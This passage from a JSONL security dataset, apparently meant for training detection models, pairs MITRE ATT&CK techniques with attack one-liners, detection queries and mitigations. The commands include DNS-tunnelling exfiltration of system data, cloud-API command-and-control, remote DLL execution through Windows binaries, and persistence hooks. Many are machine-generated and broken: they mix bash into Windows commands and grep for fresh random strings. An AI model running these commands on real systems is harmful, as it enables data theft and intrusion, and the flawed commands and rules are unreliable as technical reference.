tunneling persistence by analyzing portproxy configurations, DNS query patterns, and netsh command-line arguments; suggest portproxy restrictions."}
{"id":459,"tactic":"Defense Evasion","technique":"T1218.012: Verclsid","threat":"Using verclsid to execute DNS tunneling COM object.","command":"verclsid /C /S http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor verclsid HTTP: `wmic process where name='verclsid.exe' get commandline | findstr http`; YARA rule: `rule VerclsidDnsTunnel { strings: $a = /verclsid.*http/ nocase; condition: $a }`.","mitigation":"Restrict verclsid: `icacls %windir%\\System32\\verclsid.exe /deny Everyone:RX`; Block DLL downloads: `netsh advfirewall firewall add rule name='Block verclsid' dir=out program='%windir%\\System32\\verclsid.exe' action=block`.","references":["MITRE ATT&CK T1218.012: https://attack.mitre.org/techniques/T1218/012/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect verclsid-based DNS tunneling COM execution by analyzing HTTP downloads, verclsid command-line arguments, and DNS query patterns; suggest DLL download restrictions."}
{"id":460,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using nslookup with NS records for DNS tunneling C2.","command":"nslookup -type=NS $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor NS queries: `tshark -Y 'dns.qry.type == 2' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.","mitigation":"Restrict nslookup: `icacls %windir%\\System32\\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect DNS tunneling via nslookup NS queries by analyzing query frequency, base64-encoded subdomains, and NS record patterns; suggest DNS filtering."}
{"id":461,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using PowerShell to exfiltrate network shares via DNS A queries.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; $shares = Get-SmbShare | Out-String; $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($shares)); Resolve-DnsName -Type A $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$enc.$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor shares DNS: `wmic process where name='powershell.exe' get commandline | findstr Get-SmbShare`; DNS A spikes: `tshark -Y 'dns.qry.type == 1'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block A DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell network shares exfiltration via DNS A queries by analyzing base64-encoded subdomains, Get-SmbShare execution, and DNS traffic patterns; suggest DNS filtering."}
{"id":462,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using curl to communicate with Dropbox API for C2.","command":"curl -H \"Authorization: Bearer $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)\" https://api.dropboxapi.com/2/files/download --data '{\"path\": \"/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt\"}' -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt","detection":"Monitor curl Dropbox: `ps aux | grep curl | grep dropboxapi.com`; Network traffic: `tcpdump -i any host api.dropboxapi.com`.","mitigation":"Restrict curl: `chmod 700 /usr/bin/curl`; Block Dropbox API: `iptables -A OUTPUT -d api.dropboxapi.com -j DROP`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect curl-based C2 via Dropbox API by analyzing HTTP headers, Dropbox API endpoints, and file creation patterns; recommend API blocking."}
{"id":463,"tactic":"Persistence","technique":"T1546.005: Trap","threat":"Using trap command for DNS tunneling persistence in Linux.","command":"echo \"trap 'dig +short TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) > /dev/null' SIGHUP SIGINT SIGTERM\" >> ~/.bashrc","detection":"Monitor bashrc changes: `cat ~/.bashrc | grep trap | grep dig`; Audit file changes: `auditctl -w ~/.bashrc -p wa`.","mitigation":"Restrict bashrc writes: `chmod 600 ~/.bashrc`; Monitor shell configuration changes.","references":["MITRE ATT&CK T1546.005: https://attack.mitre.org/techniques/T1546/005/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect trap-based DNS tunneling persistence in bashrc by analyzing dig TXT commands, base64-encoded subdomains, and file modifications; suggest file protections."}
{"id":464,"tactic":"Defense Evasion","technique":"T1218.009: Regsvcs/Regasm","threat":"Using regasm to execute DNS tunneling .NET assembly with obfuscated URL.","command":"regasm /U http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)[.]com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor regasm HTTP: `wmic process where name='regasm.exe' get commandline | findstr http`; YARA rule: `rule RegasmObfDnsTunnel { strings: $a = /regasm.*http.*\[.\]/ nocase; condition: $a }`.","mitigation":"Restrict regasm: `icacls %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /deny Everyone:RX`; Block DLL downloads: `netsh advfirewall firewall add rule name='Block regasm' dir=out program='%windir%\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe' action=block`.","references":["MITRE ATT&CK T1218.009: https://attack.mitre.org/techniques/T1218/009/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect regasm-based DNS tunneling with obfuscated URLs by analyzing HTTP DLL downloads, regasm command-line arguments, and DNS query patterns; suggest DLL download restrictions."}
{"id":465,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using dig with A records for DNS tunneling C2.","command":"dig +short A $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor dig A queries: `tcpdump -i any port 53 | grep A`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect dig-based DNS tunneling with A records by analyzing query patterns, base64-encoded subdomains, and A record usage; suggest DNS inspection."}
{"id":466,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using nslookup to exfiltrate running services via DNS TXT queries.","command":"nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(sc query | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor TXT queries: `tshark -Y 'dns.qry.type == 16' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.","mitigation":"Restrict nslookup: `icacls %windir%\\System32\\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect nslookup-based DNS exfiltration of running services via TXT queries by analyzing base64-encoded subdomains and DNS traffic anomalies; recommend DNS filtering."}
{"id":467,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using Invoke-WebRequest for C2 via OneDrive API.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://api.onedrive.com/v1.0/drives/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/items/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/content -Headers @{Authorization='Bearer $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)'} -OutFile C:\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt\"","detection":"Monitor Invoke-WebRequest OneDrive: `wmic process where name='powershell.exe' get commandline | findstr api.onedrive.com`; Network traffic: `tshark -Y 'http.host contains api.onedrive.com'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block OneDrive API: `netsh advfirewall firewall add rule name='Block OneDrive' dir=out action=block remoteip=20.190.128.0/18`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect Invoke-WebRequest C2 via OneDrive API by analyzing HTTP headers, OneDrive API endpoints, and file creation patterns; recommend API blocking."}
{"id":468,"tactic":"Persistence","technique":"T1546.014: Emond","threat":"Using emond for DNS tunneling persistence on macOS.","command":"echo '<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"><plist version=\"1.0\"><dict><key>Label</key><string>$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)</string><key>ProgramArguments</key><array><string>dig</string><string>+short</string><string>TXT</string><string>$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)</string></array><key>RunAtLoad</key><true/></dict></plist>' > /etc/emond.d/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).plist","detection":"Monitor emond plists: `cat /etc/emond.d/* | grep dig | grep TXT`; Audit file changes: `auditctl -w /etc/emond.d -p wa`.","mitigation":"Restrict emond writes: `chmod 600 /etc/emond.d`; Disable emond: `launchctl unload /System/Library/LaunchDaemons/com.apple.emond.plist`.","references":["MITRE ATT&CK T1546.014: https://attack.mitre.org/techniques/T1546/014/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect emond-based DNS tunneling persistence by analyzing plist modifications, dig TXT commands, and DNS query patterns; suggest emond protections."}
{"id":469,"tactic":"Defense Evasion","technique":"T1218.011: Rundll32","threat":"Using rundll32 with shell32.dll for DNS tunneling.","command":"rundll32 shell32.dll,ShellExec_RunDLL \"nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)\"","detection":"Monitor rundll32 shell32: `wmic process where name='rundll32.exe' get commandline | findstr shell32.dll`; YARA rule: `rule Rundll32ShellDnsTunnel { strings: $a = /rundll32.*shell32.dll.*nslookup/ nocase; condition: $a }`.","mitigation":"Restrict rundll32: `icacls %windir%\\System32\\rundll32.exe /deny Everyone:RX`; Block DNS queries: `netsh advfirewall firewall add rule name='Block rundll32 DNS' dir=out program='%windir%\\System32\\rundll32.exe' action=block`.","references":["MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect rundll32 shell32.dll-based DNS tunneling by analyzing nslookup TXT queries, rundll32 command-line arguments, and DNS traffic patterns; suggest DNS restrictions."}
{"id":470,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using PowerShell to perform DNS tunneling with SOA records.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Resolve-DnsName -Type SOA $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor SOA queries: `tshark -Y 'dns.qry.type == 6' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; PowerShell DNS: `wmic process where name='powershell.exe' get commandline | findstr Resolve-DnsName`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block SOA DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect PowerShell DNS tunneling with SOA records by analyzing query patterns, base64-encoded subdomains, and SOA record usage; suggest DNS filtering."}
{"id":471,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using dig to exfiltrate crontab entries via DNS PTR queries.","command":"dig +short PTR $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(crontab -l | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor dig PTR queries: `tcpdump -i any port 53 | grep PTR`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect dig-based DNS exfiltration of crontab entries via PTR queries by analyzing base64-encoded subdomains and DNS traffic anomalies; recommend DNS inspection."}
{"id":472,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using curl to communicate with Azure Functions for C2.","command":"curl -H \"x-functions-key: $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)\" https://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).azurewebsites.net/api/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt","detection":"Monitor curl Azure: `ps aux | grep curl | grep azurewebsites.net`; Network traffic: `tcpdump -i any host azurewebsites.net`.","mitigation":"Restrict curl: `chmod 700 /usr/bin/curl`; Block Azure Functions: `iptables -A OUTPUT -d azurewebsites.net -j DROP`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect curl-based C2 via Azure Functions by analyzing HTTP headers, Azure Functions URLs, and file creation patterns; recommend API blocking."}
{"id":473,"tactic":"Persistence","technique":"T1546.003: Windows Management Instrumentation Event Subscription","threat":"Using WMI event subscription for DNS tunneling persistence.","command":"wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter CREATE Name='$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)' Query='SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Name=\"notepad.exe\"' QueryLanguage='WQL' && wmic /NAMESPACE:\\\\root\\subscription PATH CommandLineEventConsumer CREATE Name='$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)' CommandLineTemplate='nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)' && wmic /NAMESPACE:\\\\root\\subscription PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name=\"$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\"' Consumer='CommandLineEventConsumer.Name=\"$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\"'","detection":"Monitor WMI subscriptions: `wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter GET /FORMAT:LIST | findstr nslookup`; Event ID 5861.","mitigation":"Restrict WMI writes: `icacls %windir%\\System32\\wbem\\mof /deny Everyone:WX`; Audit WMI changes: `auditpol /set /subcategory:'Other Object Access Events' /success:enable`.","references":["MITRE ATT&CK T1546.003: https://attack.mitre.org/techniques/T1546/003/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect WMI event subscription-based DNS tunneling by analyzing nslookup TXT queries, WMI subscription configurations, and DNS traffic patterns; suggest WMI protections."}
{"id":474,"tactic":"Defense Evasion","technique":"T1218.005: Mshta","threat":"Using mshta with JScript for DNS tunneling.","command":"mshta jscript:Execute(\"new ActiveXObject('WScript.Shell').Run('nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)');close()\")","detection":"Monitor mshta JScript: `wmic process where name='mshta.exe' get commandline | findstr jscript`; YARA rule: `rule MshtaJsDnsTunnel { strings: $a = /mshta.*jscript.*nslookup/ nocase; condition: $a }`.","mitigation":"Restrict mshta: `icacls %windir%\\System32\\mshta.exe /deny Everyone:RX`; Block DNS queries: `netsh advfirewall firewall add rule name='Block mshta DNS' dir=out program='%windir%\\System32\\mshta.exe' action=block`.","references":["MITRE ATT&CK T1218.005: https://attack.mitre.org/techniques/T1218/005/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mshta JScript-based DNS tunneling by analyzing nslookup TXT queries, mshta command-line arguments, and DNS traffic patterns; suggest DNS restrictions."}
{"id":475,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using nslookup with SRV records for DNS tunneling C2.","command":"nslookup -type=SRV _$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)._tcp.$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor SRV queries: `tshark -Y 'dns.qry.type == 33' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.","mitigation":"Restrict nslookup: `icacls %windir%\\System32\\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect DNS tunneling via nslookup SRV queries by analyzing query frequency, base64-encoded subdomains, and SRV record patterns; suggest DNS filtering."}
{"id":476,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using PowerShell to exfiltrate installed software via DNS MX queries.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; $sw = Get-WmiObject -Class Win32_Product | Out-String; $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($sw)); Resolve-DnsName -Type MX $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$enc.$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor software DNS: `wmic process where name='powershell.exe' get commandline | findstr Win32_Product`; DNS MX spikes: `tshark -Y 'dns.qry.type == 15'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block MX DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell installed software exfiltration via DNS MX queries by analyzing base64-encoded subdomains, Win32_Product execution, and DNS traffic patterns; suggest DNS filtering."}
{"id":477,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using curl to communicate with Firebase Storage for C2.","command":"curl -H \"Authorization: Bearer $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)\" https://firebasestorage.googleapis.com/v0/b/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).appspot.com/o/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt?alt=media -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt","detection":"Monitor curl Firebase: `ps aux | grep curl | grep firebasestorage.googleapis.com`; Network traffic: `tcpdump -i any host firebasestorage.googleapis.com`.","mitigation":"Restrict curl: `chmod 700 /usr/bin/curl`; Block Firebase Storage: `iptables -A OUTPUT -d firebasestorage.googleapis.com -j DROP`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect curl-based C2 via Firebase Storage by analyzing HTTP headers, Firebase Storage URLs, and file creation patterns; recommend storage blocking."}
{"id":478,"tactic":"Persistence","technique":"T1546.009: AppCert DLLs","threat":"Using AppCert DLLs for DNS tunneling persistence with obfuscated path.","command":"reg add HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls /v $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) /t REG_SZ /d \"C:\\$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)[.]dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\" /f","detection":"Monitor AppCert DLLs: `reg query HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls | findstr dnstunnel`; Event ID 4657.","mitigation":"Restrict AppCert writes: `regini -h deny HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.","references":["MITRE ATT&CK T1546.009: https://attack.mitre.org/techniques/T1546/009/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect AppCert DLLs for DNS tunneling persistence with obfuscated paths by analyzing registry changes, DLL paths, and DNS query patterns; suggest registry protections."}
{"id":479,"tactic":"Defense Evasion","technique":"T1218.010: Regsvr32","threat":"Using regsvr32 to execute DNS tunneling DLL via SMB share.","command":"regsvr32 /s \\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com\\$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor regsvr32 SMB: `wmic process where name='regsvr32.exe' get commandline | findstr \\\\`; YARA rule: `rule Regsvr32SmbDnsTunnel { strings: $a = /regsvr32.*\\\\.*dll/ nocase; condition: $a }`.","mitigation":"Restrict regsvr32: `icacls %windir%\\System32\\regsvr32.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=out action=block protocol=TCP remoteport=445`.","references":["MITRE ATT&CK T1218.010: https://attack.mitre.org/techniques/T1218/010/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect regsvr32-based DNS tunneling via SMB shares by analyzing DLL paths, regsvr32 command-line arguments, and DNS query patterns; suggest SMB restrictions."}
{"id":480,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using PowerShell to perform DNS tunneling with CNAME records.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Resolve-DnsName -Type CNAME $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor CNAME queries: `tshark -Y 'dns.qry.type == 5' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; PowerShell DNS: `wmic process where name='powershell.exe' get commandline | findstr Resolve-DnsName`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block CNAME DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect PowerShell DNS tunneling with CNAME records by analyzing query patterns, base64-encoded subdomains, and CNAME record usage; suggest DNS filtering."}
{"id":480,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using PowerShell to perform DNS tunneling with CNAME records.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Resolve-DnsName -Type CNAME $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor CNAME queries: `tshark -Y 'dns.qry.type == 5' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; PowerShell DNS: `wmic process where name='powershell.exe' get commandline | findstr Resolve-DnsName`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block CNAME DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect PowerShell DNS tunneling with CNAME records by analyzing query patterns, base64-encoded subdomains, and CNAME record usage; suggest DNS filtering."}
{"id":481,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using nslookup to exfiltrate network configuration via DNS AAAA queries.","command":"nslookup -type=AAAA $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(ipconfig /all | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor AAAA queries: `tshark -Y 'dns.qry.type == 28' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.","mitigation":"Restrict nslookup: `icacls %windir%\\System32\\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect nslookup-based DNS exfiltration of network configuration via AAAA queries by analyzing base64-encoded subdomains and DNS traffic anomalies; recommend DNS filtering."}
{"id":482,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using Invoke-WebRequest for C2 via Google Drive API.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://www.googleapis.com/drive/v3/files/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)?alt=media -Headers @{Authorization='Bearer $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)'} -OutFile C:\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt\"","detection":"Monitor Invoke-WebRequest Google Drive: `wmic process where name='powershell.exe' get commandline | findstr www.googleapis.com`; Network traffic: `tshark -Y 'http.host contains www.googleapis.com'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block Google Drive API: `netsh advfirewall firewall add rule name='Block Google Drive' dir=out action=block remoteip=142.250.0.0/15`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect Invoke-WebRequest C2 via Google Drive API by analyzing HTTP headers, Google Drive API endpoints, and file creation patterns; recommend API blocking."}
